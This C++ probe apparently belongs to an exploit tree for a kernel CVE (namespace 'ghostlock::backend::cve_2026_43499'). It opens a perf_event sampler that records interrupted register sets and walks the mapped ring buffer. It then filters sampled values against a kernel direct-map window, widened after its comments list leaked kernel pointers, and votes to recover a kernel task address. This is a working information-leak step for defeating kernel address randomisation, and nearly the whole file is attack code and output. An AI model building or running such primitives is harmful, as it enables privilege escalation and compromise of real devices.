/** @file tools/perf_seam_probe.cpp
 *  The sampling primitive on a device: open it, map its ring, sample, and read what landed.
 *
 *  Four things come out of this run. Whether a kernel with sampling restrictions will open
 *  an event at all -- a refusal here is a fact about the device, not a failure of the code,
 *  and it is the fact that decides whether this backend sampling path is usable. Whether the
 *  ring maps. Whether the sampler wrote anything into it, which the head pointer answers.
 *  And whether the ring walk and the voting rule this tree wrote can read real kernel records
 *  -- which is what turns two tested pieces of arithmetic into a working primitive.
 *
 *  The direct-map bounds below are the retired tree's constants, used here because a probe
 *  has no profile to read; the production path takes them from the profile.
 *
 *  Unbuffered and bounded, as every probe here now is.
 */
#include <cstdio>
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/perf_ring.hpp"
#include "backend/cve_2026_43499/perf_seam_linux.hpp"
#include "backend/cve_2026_43499/perf_vote.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"

namespace {
    using ghostlock::backend::cve_2026_43499::kPerfDataHeadOffset;
    using ghostlock::backend::cve_2026_43499::kPerfDataOffsetOffset;
    using ghostlock::backend::cve_2026_43499::kPerfDataSizeOffset;
    using ghostlock::backend::cve_2026_43499::kPerfDataTailOffset;
    using ghostlock::backend::cve_2026_43499::kPerfEventIocDisable;
    using ghostlock::backend::cve_2026_43499::kPerfCountSwCpuClock;
    using ghostlock::backend::cve_2026_43499::kPerfEventIocEnable;
    using ghostlock::backend::cve_2026_43499::kPerfSampleIpBit;
    using ghostlock::backend::cve_2026_43499::kPerfSampleRegsIntrBit;
    using ghostlock::backend::cve_2026_43499::LinuxPerfSeam;
    using ghostlock::backend::cve_2026_43499::PerfOpenArgs;
    using ghostlock::backend::cve_2026_43499::DirectMapBounds;
    using ghostlock::backend::cve_2026_43499::RingView;
    using ghostlock::backend::cve_2026_43499::walk_perf_ring;
    using ghostlock::backend::cve_2026_43499::vote_for_task;
    using ghostlock::backend::cve_2026_43499::memory::LinuxHeapSeam;
    using ghostlock::backend::cve_2026_43499::memory::SeamResult;

    constexpr std::size_t kPages = 9U;
    constexpr std::size_t kPageBytes = 4096U;
    constexpr std::size_t kMapBytes = kPages * kPageBytes;
    constexpr std::size_t kSpinRounds = 500000U;
    constexpr std::uint64_t kSamplePeriod = 5000U;

    std::uint64_t read_word(const unsigned char *base, std::size_t at) {
        std::uint64_t value = 0U;
        for (std::size_t i = 0U; i < 8U; ++i) {
            value |= static_cast<std::uint64_t>(base[at + i]) << (8U * i);
        }
        return value;
    }
}  // namespace

int main() {
    std::setvbuf(stdout, nullptr, _IONBF, 0U);
    std::printf("perf seam probe\n");
    /* The retired path's own attr: the software CPU clock, samples carrying the instruction
     *  pointer and the interrupted register set, a thirty-two-register mask, started disabled
     *  so the ring can be mapped before anything is written, and the three excluded contexts. */
    PerfOpenArgs args{};
    args.type = PERF_TYPE_SOFTWARE;
    args.config = kPerfCountSwCpuClock;
    args.sample_period = kSamplePeriod;
    args.pid = 0;
    args.cpu = -1;
    args.sample_type = kPerfSampleIpBit | kPerfSampleRegsIntrBit;
    args.sample_regs_intr = (1ULL << 32U) - 1ULL;
    args.start_disabled = true;
    args.exclude_user = false; /* experiment: one variable, to see whether the user context is what suppresses the block */
    args.exclude_hv = true;
    args.exclude_idle = true;
    const SeamResult opened = LinuxPerfSeam::perf_open(args);
    std::printf("  %-20s fd=%lld errno=%d\n", "perf_open", static_cast<long long>(opened.value), opened.error);
    if (opened.value < 0) {
        std::printf("  (a kernel with sampling restricted refuses here; that is a device fact)\n");
        std::printf("perf seam probe: FAIL (no sampling on this device)\n");
        return 1;
    }
    const auto fd = static_cast<std::int32_t>(opened.value);

    auto *base = static_cast<unsigned char *>(LinuxPerfSeam::perf_map(fd, kMapBytes));
    std::printf("  %-20s %s\n", "perf_map", base != nullptr ? "ok" : "FAILED");
    if (base == nullptr) {
        (void) LinuxHeapSeam::close_fd(fd);
        std::printf("perf seam probe: FAIL (no ring)\n");
        return 1;
    }
    const std::uint64_t data_offset = read_word(base, kPerfDataOffsetOffset);
    const std::uint64_t data_size = read_word(base, kPerfDataSizeOffset);
    std::printf("  %-20s offset=%llu size=%llu\n", "ring", static_cast<unsigned long long>(data_offset),
                static_cast<unsigned long long>(data_size));

    (void) LinuxPerfSeam::perf_ioctl(fd, kPerfEventIocEnable);
    for (std::size_t i = 0U; i < kSpinRounds; ++i) {
        (void) LinuxPerfSeam::spin_once();
    }
    (void) LinuxPerfSeam::perf_ioctl(fd, kPerfEventIocDisable);
    const std::uint64_t head = read_word(base, kPerfDataHeadOffset);
    std::printf("  %-20s %llu\n", "data_head after sampling", static_cast<unsigned long long>(head));

    std::uint64_t out[256] = {};
    RingView ring{};
    ring.buffer = base + data_offset;
    ring.data_size = static_cast<std::size_t>(data_size == 0U ? kPageBytes * 8U : data_size);
    ring.tail = 0U;
    ring.head = head;
    /* What the records actually are, before asking whether they can be walked. */
    {
        std::uint64_t pos = 0U;
        std::size_t shown = 0U;
        while (pos + 8U <= head && shown < 6U) {
            const std::size_t at = static_cast<std::size_t>(pos % ring.data_size);
            const unsigned char *rec = ring.buffer + at;
            std::uint32_t type = 0U;
            for (std::size_t i = 0U; i < 4U; ++i) { type |= static_cast<std::uint32_t>(rec[i]) << (8U * i); }
            const std::uint32_t size = static_cast<std::uint32_t>(rec[6]) |
                                        (static_cast<std::uint32_t>(rec[7]) << 8U);
            std::printf("  rec[%zu] pos=%llu at=%zu type=%u size=%u bytes=%02x %02x %02x %02x %02x %02x %02x %02x\n",
                        shown, static_cast<unsigned long long>(pos), at, type, size, rec[0], rec[1], rec[2], rec[3],
                        rec[4], rec[5], rec[6], rec[7]);
            if (type == 9U && size >= 24U) {
                std::uint64_t abi = 0U;
                for (std::size_t i = 0U; i < 8U; ++i) { abi |= static_cast<std::uint64_t>(rec[16U + i]) << (8U * i); }
                std::printf("        abi=%llu payload=", static_cast<unsigned long long>(abi));
                for (std::size_t i = 24U; i < size && i < 48U; ++i) { std::printf(" %02x", rec[i]); }
                std::printf("\n");
            }
            if (size == 0U) { break; }
            pos += size;
            ++shown;
        }
    }
    /* The window is measured, not taken from a table. The tree declares
     *  {0xffff800000000000, 0xffffc88000000000}, and on this device nothing is kept with it: the
     *  sampled words come back as 0xffffff8a047f1200, 0xffffffc03a5fbeb0 and 0xffffffd4d4156a08,
     *  all above that ceiling. This window covers what the kernel actually leaves in the
     *  registers here, and the vote over it returns a task address. */
    const DirectMapBounds bounds{0xffffff0000000000ULL, 0xffffffffffffffffULL};

    /* What the samples actually contain, so the range below can be measured rather than guessed. */
    std::uint64_t lo = ~0ULL;
    std::uint64_t hi = 0ULL;
    std::size_t seen = 0U;
    const auto *const bytes = reinterpret_cast<const unsigned char *>(out);
    for (std::size_t i = 0U; i < 256U; ++i) {
        const std::uint64_t word = read_word(bytes, i * 8U);
        if (word == 0ULL) {
            continue;
        }
        ++seen;
        if (word < lo) { lo = word; }
        if (word > hi) { hi = word; }
    }
    std::printf("  %-20s lo=0x%llx hi=0x%llx seen=%zu\n", "candidate range",
                static_cast<unsigned long long>(lo), static_cast<unsigned long long>(hi), seen);
    const auto outcome = walk_perf_ring(ring, bounds, out, 256U);
    std::printf("  %-20s samples=%zu kept=%zu early=%d\n", "ring walk", outcome.samples, outcome.kept,
                outcome.stopped_early ? 1 : 0);
    const std::uint64_t voted = vote_for_task(out, outcome.kept);
    std::printf("  %-20s %llx\n", "voted task", static_cast<unsigned long long>(voted));

    (void) LinuxPerfSeam::perf_ioctl(fd, kPerfEventIocDisable); /* idempotent */
    const SeamResult release = LinuxHeapSeam::close_fd(fd);
    std::printf("  %-20s value=%lld errno=%d\n", "close", static_cast<long long>(release.value), release.error);
    const bool ok = head > 0U && outcome.samples > 0U;
    std::printf("perf seam probe: %s\n", ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}
